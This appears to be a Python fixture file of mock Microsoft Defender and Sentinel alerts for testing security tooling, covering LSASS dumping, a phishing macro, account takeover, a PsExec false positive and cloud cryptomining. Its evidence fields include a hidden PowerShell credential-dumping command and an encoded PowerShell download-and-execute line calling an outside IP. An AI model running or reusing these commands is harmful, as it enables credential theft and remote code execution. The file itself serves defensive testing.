"""Realistic Mock Data for Microsoft Defender XDR Alerts and Incidents.
Matches Microsoft Graph Security API v1.0 `/security/alerts_v2` schema.
"""

from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any

now = datetime.now(timezone.utc)

MOCK_DEFENDER_ALERTS: List[Dict[str, Any]] = [
    {
        "id": "da-9821-lsass-dump",
        "providerAlertId": "edr-alert-20261024-9912",
        "incidentId": "inc-48102",
        "status": "new",
        "severity": "high",
        "classification": None,
        "determination": None,
        "serviceSource": "microsoftDefenderForEndpoint",
        "detectionSource": "edr",
        "category": "CredentialAccess",
        "title": "Suspicious credential dumping from LSASS process memory",
        "description": "An unauthorized process accessed and attempted to read credentials from Local Security Authority Subsystem Service (lsass.exe). This activity is commonly associated with tools like Mimikatz or procdump.",
        "createdDateTime": (now - timedelta(minutes=25)).isoformat(),
        "lastUpdateDateTime": (now - timedelta(minutes=5)).isoformat(),
        "recommendedActions": "1. Immediately isolate the affected device from the network.\n2. Revoke active sessions and force password reset for affected user accounts.\n3. Search for lateral movement using Advanced Hunting.",
        "mitreTechniques": [
            "T1003.001",  # OS Credential Dumping: LSASS Memory
            "T1059.001",  # PowerShell
            "T1078.002"   # Valid Accounts: Domain Accounts
        ],
        "evidence": [
            {
                "@odata.type": "#microsoft.graph.security.deviceEvidence",
                "deviceDnsName": "FIN-SRV-01.corp.contoso.com",
                "osPlatform": "WindowsServer2022",
                "loggedOnUsers": [{"accountName": "svc_backup", "domainName": "CORP"}],
                "ipInterfaces": ["10.240.12.85"],
                "healthStatus": "active",
                "riskScore": "high",
                "roles": ["domainJoined", "criticalAsset"]
            },
            {
                "@odata.type": "#microsoft.graph.security.userEvidence",
                "userAccount": {
                    "accountName": "svc_backup",
                    "domainName": "CORP",
                    "userPrincipalName": "svc_backup@contoso.com",
                    "userSid": "S-1-5-21-3623811015-3361044348-30300820-1104"
                },
                "roles": ["serviceAccount", "elevatedPrivileges"]
            },
            {
                "@odata.type": "#microsoft.graph.security.processEvidence",
                "processCommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"& {rundll32.exe C:\\ProgramData\\updater.dll,DumpLSASS}\"",
                "parentProcessCommandLine": "cmd.exe /c start powershell.exe",
                "processCreationDateTime": (now - timedelta(minutes=26)).isoformat(),
                "processId": 4812,
                "parentProcessId": 3204,
                "imageFile": {
                    "fileName": "powershell.exe",
                    "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "sha256": "8a6c5f0b4d2e8b7a6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b"
                }
            },
            {
                "@odata.type": "#microsoft.graph.security.fileEvidence",
                "fileName": "updater.dll",
                "filePath": "C:\\ProgramData\\updater.dll",
                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "roles": ["maliciousPayload", "droppedFile"]
            },
            {
                "@odata.type": "#microsoft.graph.security.ipEvidence",
                "ipAddress": "194.26.29.112",
                "countryCode": "RU"
            }
        ]
    },
    {
        "id": "da-8710-phish-macro-c2",
        "providerAlertId": "edr-alert-20261024-8119",
        "incidentId": "inc-48099",
        "status": "new",
        "severity": "high",
        "classification": None,
        "determination": None,
        "serviceSource": "microsoftDefenderForEndpoint",
        "detectionSource": "antivirus",
        "category": "Execution",
        "title": "Malicious macro executed encoded PowerShell and initiated C2 beacon",
        "description": "Microsoft Word spawned a hidden PowerShell process that executed an obfuscated base64 command and attempted outbound network communication to an untrusted external IP address.",
        "createdDateTime": (now - timedelta(minutes=58)).isoformat(),
        "lastUpdateDateTime": (now - timedelta(minutes=40)).isoformat(),
        "recommendedActions": "1. Isolate the workstation WKSTN-EXEC-09.\n2. Block destination C2 IP 185.220.101.52 on firewall / Defender web protection.\n3. Check user email for phishing lure.",
        "mitreTechniques": [
            "T1204.002",  # User Execution: Malicious File
            "T1059.001",  # Command and Scripting Interpreter: PowerShell
            "T1071.001"   # Application Layer Protocol: Web Protocols (C2)
        ],
        "evidence": [
            {
                "@odata.type": "#microsoft.graph.security.deviceEvidence",
                "deviceDnsName": "WKSTN-EXEC-09.corp.contoso.com",
                "osPlatform": "Windows11",
                "loggedOnUsers": [{"accountName": "john.smith", "domainName": "CORP"}],
                "ipInterfaces": ["10.240.50.119"],
                "riskScore": "medium"
            },
            {
                "@odata.type": "#microsoft.graph.security.userEvidence",
                "userAccount": {
                    "accountName": "john.smith",
                    "domainName": "CORP",
                    "userPrincipalName": "john.smith@contoso.com"
                }
            },
            {
                "@odata.type": "#microsoft.graph.security.processEvidence",
                "processCommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                "parentProcessCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.smith\\Downloads\\Invoice_October_Q3.docm\"",
                "processCreationDateTime": (now - timedelta(minutes=57)).isoformat(),
                "processId": 6720,
                "parentProcessId": 1840,
                "imageFile": {
                    "fileName": "powershell.exe",
                    "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                }
            },
            {
                "@odata.type": "#microsoft.graph.security.fileEvidence",
                "fileName": "Invoice_October_Q3.docm",
                "filePath": "C:\\Users\\john.smith\\Downloads\\Invoice_October_Q3.docm",
                "sha256": "b4c6e9a18274d12301f98cde7261ab7289012cdbf8912304981726354890abcd"
            },
            {
                "@odata.type": "#microsoft.graph.security.ipEvidence",
                "ipAddress": "185.220.101.52",
                "countryCode": "NL",
                "url": "http://185.220.101.52/payload.ps1"
            }
        ]
    },
    {
        "id": "da-7640-cloud-impossible-travel",
        "providerAlertId": "mcas-alert-20261024-5510",
        "incidentId": "inc-48080",
        "status": "new",
        "severity": "medium",
        "classification": None,
        "determination": None,
        "serviceSource": "microsoftDefenderForCloudApps",
        "detectionSource": "cloudAppSecurity",
        "category": "InitialAccess",
        "title": "Atypical travel and anomalous inbox forwarding rule created",
        "description": "User sarah.connor logged in from New York, USA, and 18 minutes later from Lagos, Nigeria. Immediately following the sign-in, an Exchange inbox rule was created to forward all emails containing 'invoice' or 'wire' to an external Gmail account.",
        "createdDateTime": (now - timedelta(hours=2)).isoformat(),
        "lastUpdateDateTime": (now - timedelta(hours=1, minutes=45)).isoformat(),
        "recommendedActions": "1. Revoke Entra ID user sessions for sarah.connor@contoso.com.\n2. Disable or delete the malicious Exchange forwarding rule.\n3. Reset account password and enforce MFA re-registration.",
        "mitreTechniques": [
            "T1078.004",  # Valid Accounts: Cloud Accounts
            "T1114.003"   # Email Collection: Email Forwarding Rule
        ],
        "evidence": [
            {
                "@odata.type": "#microsoft.graph.security.userEvidence",
                "userAccount": {
                    "accountName": "sarah.connor",
                    "domainName": "CONTOSO",
                    "userPrincipalName": "sarah.connor@contoso.com"
                },
                "roles": ["financeDirector"]
            },
            {
                "@odata.type": "#microsoft.graph.security.ipEvidence",
                "ipAddress": "102.89.33.14",
                "countryCode": "NG"
            },
            {
                "@odata.type": "#microsoft.graph.security.ipEvidence",
                "ipAddress": "64.233.160.1",
                "countryCode": "US"
            },
            {
                "@odata.type": "#microsoft.graph.security.mailboxEvidence",
                "primaryAddress": "sarah.connor@contoso.com",
                "forwardingAddress": "billing-audit-ops@gmail.com"
            }
        ]
    },
    {
        "id": "da-5120-admin-psexec-fp",
        "providerAlertId": "edr-alert-20261024-3321",
        "incidentId": "inc-48050",
        "status": "new",
        "severity": "low",
        "classification": None,
        "determination": None,
        "serviceSource": "microsoftDefenderForEndpoint",
        "detectionSource": "edr",
        "category": "LateralMovement",
        "title": "Remote service creation via PsExec detected",
        "description": "PsExec was used to remotely start PSEXESVC on server FILE-SRV-02 from ADMIN-JUMP-01 by user admin_it_ops.",
        "createdDateTime": (now - timedelta(hours=3, minutes=15)).isoformat(),
        "lastUpdateDateTime": (now - timedelta(hours=3)).isoformat(),
        "recommendedActions": "Verify whether this administrative action was part of scheduled IT maintenance window CR-2026-904.",
        "mitreTechniques": [
            "T1021.002",  # Remote Services: SMB/Windows Admin Shares
            "T1569.002"   # System Services: Service Execution
        ],
        "evidence": [
            {
                "@odata.type": "#microsoft.graph.security.deviceEvidence",
                "deviceDnsName": "FILE-SRV-02.corp.contoso.com",
                "osPlatform": "WindowsServer2022",
                "ipInterfaces": ["10.240.10.22"]
            },
            {
                "@odata.type": "#microsoft.graph.security.userEvidence",
                "userAccount": {
                    "accountName": "admin_it_ops",
                    "domainName": "CORP",
                    "userPrincipalName": "admin_it_ops@contoso.com"
                },
                "roles": ["itAdministrator"]
            },
            {
                "@odata.type": "#microsoft.graph.security.processEvidence",
                "processCommandLine": "C:\\Windows\\PSEXESVC.exe",
                "parentProcessCommandLine": "services.exe",
                "processCreationDateTime": (now - timedelta(hours=3, minutes=14)).isoformat(),
                "processId": 5104
            }
        ]
    },
    {
        "id": "sen-4410-keyvault-cryptominer",
        "providerAlertId": "sentinel-rule-alert-20261024-8831",
        "incidentId": "inc-48120",
        "status": "new",
        "severity": "high",
        "classification": None,
        "determination": None,
        "serviceSource": "microsoftSentinel",
        "detectionSource": "scheduledAnalyticRule",
        "category": "Exfiltration",
        "title": "Microsoft Sentinel: Mass Key Vault secret access followed by unauthorized Azure VM deployment",
        "description": "Microsoft Sentinel analytic rule detected service principal svc-terraform-deploy accessing 48 secrets in Key Vault 'kv-prod-eastus' from untrusted IP 195.154.122.9, followed immediately by Azure Resource Manager deployment of an unapproved GPU VM 'miner-rig-01' in a non-standard region (West US 3).",
        "createdDateTime": (now - timedelta(minutes=15)).isoformat(),
        "lastUpdateDateTime": (now - timedelta(minutes=2)).isoformat(),
        "recommendedActions": "1. Immediately rotate the compromised Key Vault secrets and service principal credentials.\n2. Deallocate and terminate the rogue Azure Virtual Machine.\n3. Add untrusted IP 195.154.122.9 to conditional access blocklist.",
        "mitreTechniques": [
            "T1552.004",  # Unsecured Credentials: Cloud Secrets
            "T1530",      # Data from Cloud Storage Object
            "T1496"       # Resource Hijacking (Cryptomining)
        ],
        "evidence": [
            {
                "@odata.type": "#microsoft.graph.security.userEvidence",
                "userAccount": {
                    "accountName": "svc-terraform-deploy",
                    "domainName": "CONTOSO",
                    "userPrincipalName": "svc-terraform-deploy@contoso.com"
                },
                "roles": ["servicePrincipal", "contributor"]
            },
            {
                "@odata.type": "#microsoft.graph.security.cloudResourceEvidence",
                "resourceName": "kv-prod-eastus",
                "resourceType": "Microsoft.KeyVault/vaults",
                "resourceId": "/subscriptions/sub-9901-prod/resourceGroups/rg-security-prod/providers/Microsoft.KeyVault/vaults/kv-prod-eastus",
                "cloudProvider": "Azure"
            },
            {
                "@odata.type": "#microsoft.graph.security.cloudResourceEvidence",
                "resourceName": "miner-rig-01",
                "resourceType": "Microsoft.Compute/virtualMachines",
                "resourceId": "/subscriptions/sub-9901-prod/resourceGroups/rg-compute-temp/providers/Microsoft.Compute/virtualMachines/miner-rig-01",
                "cloudProvider": "Azure"
            },
            {
                "@odata.type": "#microsoft.graph.security.ipEvidence",
                "ipAddress": "195.154.122.9",
                "countryCode": "FR"
            }
        ]
    }
]
